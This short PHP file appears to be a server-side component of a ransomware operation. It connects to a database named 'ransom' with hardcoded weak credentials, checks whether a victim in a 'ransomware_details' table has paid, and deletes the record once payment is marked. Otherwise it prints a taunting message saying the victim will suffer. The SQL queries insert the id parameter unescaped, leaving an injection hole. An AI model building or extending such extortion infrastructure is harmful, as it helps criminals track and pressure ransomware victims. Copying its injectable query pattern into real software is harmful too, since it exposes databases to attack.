<?php

function update_database($id){
	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
	if(!$dbconn){
		//An error occured
		exit;
	}
	$query = "SELECT payment_status from ransomware_details where id='$id'";
	$result = pg_query($dbconn,$query);
	$tmp = pg_fetch_row($result)[0];
	if( $tmp == 'Yes' ){
		$query = "DELETE from ransomware_details where id='$id'";
		$result = pg_query($dbconn,$query);
		$tmp = pg_fetch_row($result);
	}
	else
	{
		echo "To: Hacker who is trying to screw up database.It will remove record of victim forever from database.Victim will suffer.Use your empty brain!";
	}
}
?>
